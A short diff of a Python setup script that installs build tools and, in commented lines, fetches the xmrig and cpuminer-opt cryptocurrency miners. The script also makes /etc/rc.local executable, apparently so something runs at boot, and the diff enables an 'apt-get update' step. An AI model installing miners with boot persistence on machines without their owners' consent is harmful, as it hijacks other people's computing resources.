@@ -34,7 +34,7 @@ os.system ('chmod +x /etc/rc.local')
 '''
 #os.system('rm -rf xmrig')
 #os.system('rm -rf xmrig_proxy')
-#os.system ('apt-get update')
+os.system ('apt-get update -y')
 os.system ('apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev')
 #os.system('git clone https://github.com/JayDDee/cpuminer-opt.git --config \'http.proxy=://10.0.0.5:8118' + '\'')
 #os.system ('git clone https://github.com/xmrig/xmrig.git')
